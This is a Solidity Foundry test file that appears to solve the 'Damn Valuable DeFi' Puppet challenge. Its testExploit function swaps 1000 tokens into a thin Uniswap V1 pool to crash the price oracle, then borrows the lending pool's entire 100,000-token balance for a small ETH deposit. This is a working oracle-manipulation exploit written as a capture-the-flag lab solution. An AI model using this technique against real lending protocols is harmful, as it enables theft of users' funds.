// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

import {PuppetPool} from "../src/puppet/PuppetPool.sol";
import {DamnValuableToken} from "../src/DamnValuableToken.sol";
import {IUniswapFactory, IUniswapExchange} from "./interface/uniswapV1.sol";

contract puppetTest is Test {
    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapFactory uniswapV1Factory;
    IUniswapExchange exchangeTemplate;
    IUniswapExchange uniswapExchange;

    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    uint256 UNISWAP_INITIAL_TOKEN_RESERVE = 10 ether;
    uint256 UNISWAP_INITIAL_ETH_RESERVE = 10 ether;

    uint256 PLAYER_INITIAL_TOKEN_BALANCE = 1000 ether;
    uint256 PLAYER_INITIAL_ETH_BALANCE = 25 ether;

    uint256 POOL_INITIAL_TOKEN_BALANCE = 100000 ether;

    modifier excuteByUser(address _user) {
        vm.startPrank(_user);
        _;
        vm.stopPrank();
    }

    // 计算输出量
    function calculateTokenToEthInputPrice(
        uint256 tokensSold, // 输入数量
        uint256 tokensInReserve, // 输入储备量
        uint256 etherInReserve // 输出储备量
    ) internal pure returns (uint256) {
        return
            (tokensSold * 997 * etherInReserve) /
            (tokensInReserve * 1000 + tokensSold * 997);
    }

    function setUp() public excuteByUser(deployer) {
        deal(player, PLAYER_INITIAL_ETH_BALANCE);
        deal(deployer, UNISWAP_INITIAL_ETH_RESERVE);

        // Deploy token to be traded in Uniswap
        token = new DamnValuableToken();

        // Deploy a exchange that will be used as the factory template
        exchangeTemplate = IUniswapExchange(
            deployCode("./build-uniswap-v1/UniswapV1Exchange.json")
        );

        // Deploy factory, initializing it with the address of the template exchange
        uniswapV1Factory = IUniswapFactory(
            deployCode("./build-uniswap-v1/UniswapV1Factory.json")
        );
        uniswapV1Factory.initializeFactory(address(exchangeTemplate));

        // Create a new exchange for the token, and retrieve the deployed exchange's address
        uniswapExchange = IUniswapExchange(
            uniswapV1Factory.createExchange(address(token))
        );

        // Deploy the lending pool
        lendingPool = new PuppetPool(address(token), address(uniswapExchange));

        // Add initial token and ETH liquidity to the pool
        token.approve(address(uniswapExchange), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapExchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
            0, // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            block.timestamp * 2 // deadline
        );

        // Ensure Uniswap exchange is working as expected
        // uniswapExchange.getTokenToEthInputPrice(1 ether);
        assertEq(
            uniswapExchange.getTokenToEthInputPrice(1 ether),
            calculateTokenToEthInputPrice(
                1 ether,
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );

        // Setup initial token balances of pool and player accounts
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
        // lendingPool.calculateDepositRequired(1 ether);
        assertEq(lendingPool.calculateDepositRequired(1 ether), 2 ether);
        assertEq(
            lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE),
            POOL_INITIAL_TOKEN_BALANCE * 2
        );
    }

    function testExploit() public excuteByUser(player) {
        // 1000 dvt => 9.9 ether
        token.approve(address(uniswapExchange), 1000 ether);
        uniswapExchange.tokenToEthSwapInput(1000 ether, 1, block.timestamp * 2);
        // exchange's price has changed_

        // borrow all token
        uint256 depositReq = lendingPool.calculateDepositRequired(
            POOL_INITIAL_TOKEN_BALANCE
        );
        // player have 34.99 ether
        lendingPool.borrow{value: depositReq}(
            POOL_INITIAL_TOKEN_BALANCE,
            player
        );

        assertEq(token.balanceOf(address(lendingPool)), 0);
        assertGe(token.balanceOf(player), POOL_INITIAL_TOKEN_BALANCE);
    }
}
